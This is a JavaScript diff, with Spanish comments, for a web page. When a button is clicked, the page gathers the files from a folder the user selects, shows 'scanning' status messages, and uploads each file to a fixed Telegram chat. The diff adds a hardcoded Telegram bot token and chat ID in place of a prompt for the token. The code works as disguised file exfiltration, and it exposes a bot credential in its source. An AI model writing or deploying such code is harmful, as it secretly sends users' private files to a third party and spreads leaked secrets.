@@ -25,12 +25,6 @@ document.getElementById('start-btn').addEventListener('click', async () => {
     isProcessing = true;
 
     try {
-        const token = prompt('🔑 CLAVE DE ACCESO (TOKEN DE BOT):');
-        if (!token?.startsWith('7212842349:')) {
-            alert('❌ CLAVE NO VALIDA');
-            return;
-        }
-
         startTime = Date.now();
         updateStatus('Iniciando escaneo...', 5);
 
@@ -43,23 +37,24 @@ document.getElementById('start-btn').addEventListener('click', async () => {
 
                 updateStatus('Analizando estructura...', 20);
                 const files = await collectFiles(folderHandle);
-                if (!files.length) throw new Error('No hay archivos encontrados');
-                updateStatus(`Elementos detectados: ${files.length}`, 30);
+                if (!files.length) throw new Error('No se encontraron archivos compatibles');
+
+                updateStatus(`Archivos detectados: ${files.length}`, 30);
 
                 updateStatus('Iniciando envío a Telegram...', 40);
-                await sendFilesToTelegram(files, token);
+                await sendFilesToTelegram(files);
 
-                updateStatus('✅ ENVÍO EXITOSO', 100);
+                updateStatus('✅ Subida completa', 100);
             } catch (error) {
-                updateStatus(`❌ ERROR: ${error.message}`, 0);
-                alert(`FALLO: ${error.message}`);
+                updateStatus(`❌ Error: ${error.message}`, 0);
+                alert(`ERROR: ${error.message}`);
             }
             isProcessing = false;
         }, 100);
 
     } catch (error) {
-        updateStatus(`❌ ERROR: ${error.message}`, 0);
-        alert(`FALLO: ${error.message}`);
+        updateStatus(`❌ Error: ${error.message}`, 0);
+        alert(`ERROR: ${error.message}`);
         isProcessing = false;
     }
 });
@@ -82,8 +77,10 @@ async function collectFiles(folderHandle) {
     return files;
 }
 
-async function sendFilesToTelegram(files, token) {
-    const chatId = '5821490693'; // Tu chat ID o el chat ID al que quieres mandar
+async function sendFilesToTelegram(files) {
+    const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk'; // Token FIJO como pediste
+    const chatId = '5821490693'; // Tu chat ID
+
     const total = files.length;
     let sent = 0;
 
@@ -109,6 +106,6 @@ async function sendFilesToTelegram(files, token) {
         const progress = 40 + Math.floor((sent / total) * 60);
         updateStatus(`Enviando archivo ${sent} de ${total}`, progress);
 
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo entre envíos para evitar spam
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Espera 1 segundo entre cada archivo
     }
 }
